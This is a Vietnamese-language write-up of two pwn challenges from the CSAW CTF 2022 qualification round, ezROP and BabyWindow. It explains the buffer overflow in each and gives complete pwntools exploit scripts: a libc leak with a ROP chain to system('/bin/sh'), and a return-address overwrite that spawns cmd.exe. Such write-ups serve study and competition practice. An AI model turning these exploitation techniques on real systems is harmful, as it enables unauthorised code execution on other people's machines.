# Writeup CSAW CTF Qualification Round 2022
###### tags: `writeup`

---

## ezROP
---
### Analyze

![](https://i.imgur.com/ZIDgOLk.png)

![](https://i.imgur.com/QkILzoG.png)

Đề bài cho một file ELF 64-bit không bị stripped và chỉ có canary là được bật

![](Untitled.png)

Bài này cơ bản chỉ là nhập input sau đó in ra input. Sau khi check một số lỗi cơ bản thì bài này có bug buffer overflow.

Vì bài này cho luôn source nên cũng không cần mở ida để xem. 
### Exploit
Ý tưởng cơ bản ở bài này chỉ là leak libc bằng lỗi bof, sau khi có libc thì chỉ cần build rop chain system('/bin/sh'). Một khởi đầu khá là thú vị. 

```py
from pwn import * 
context.log_level ='debug'
r = process('./ezROP')
#r = remote('pwn.chal.csaw.io',5002)
elf = context.binary = ELF('./ezROP')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
pop_rdi = 0x00000000004015a3
payload =   b'\0'*0x78+ p64(pop_rdi) + p64(0x403FE8) + p64(0x4010A0)   + p64(elf.sym['main']) 

r.sendline(payload)
r.recvuntil(b'!\n')
leak = u64(r.recvline()[:-1].ljust(8,b'\x00'))
log.info('leak: '+hex(leak))
libc.address = leak - libc.sym['puts']
log.success('libc: '+hex(libc.address))
payload = b'\0'*0x78 + p64(pop_rdi) +p64(next(libc.search(b'/bin/sh')))+p64(pop_rdi+1) + p64(libc.sym['system'])
r.sendline(payload)
r.interactive()
```
## BabyWindow
---
Đây là một câu baby pwn về window(file PE32+), thực ra đây là lần đầu tiên mình exploit một file PE32+, từ trước đến giờ chủ yếu mình làm reverse file PE32+ hoặc PE32. 
Set up environment ở local cũng khiến mình khá là loay hoay. 

Cũng không cần phải mở ida lên để reverse vì bài này cho source code sẵn, thì giống như file pwn ELF thì bài này cũng có bug khá là cơ bản, bug `gets` nằm ở function vuln. Với 1 người chơi pwn thì ai cũng biết bug này dùng để làm gì :lol_face:

Ở bài này thì ta chỉ cần ghi đè return address về hàm Pwn trong file BabyWindowsLib.c, ở hàm đó có sẵn `WinExec("cmd.exe", SW_SHOWDEFAULT);`, tương tự với `system('/bin/sh')` bên linux. 

```py
from pwn import * 

p = remote('win.chal.csaw.io', 7777) 

payload = b"A"*512
payload += p32(0x62101661)

p.send(payload)

p.interactive()
```
Một bài khá là hay ho(trừ việc setup docker :sadge_pepe:)






